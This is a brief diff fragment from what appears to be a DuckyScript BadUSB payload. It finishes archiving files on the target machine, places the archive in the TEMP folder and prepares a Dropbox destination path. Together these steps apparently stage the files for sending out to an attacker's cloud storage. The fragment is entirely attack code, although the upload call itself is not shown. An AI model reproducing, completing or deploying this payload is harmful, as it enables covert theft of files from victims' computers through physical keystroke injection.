@@ -90,7 +90,7 @@ DELAY 500
 STRINGLN  -DestinationPath ./#ARCHIVE_NAME
 DELAY 1000
 
-STRINGLN
+STRINGLN_POWERSHELL
     $filePath = "$env:TEMP/#ARCHIVE_NAME"
     $filePath = $filePath -replace "\\", "/"
     $dropboxPath = "#DROPBOX_FOLDER_PATH#ARCHIVE_NAME"
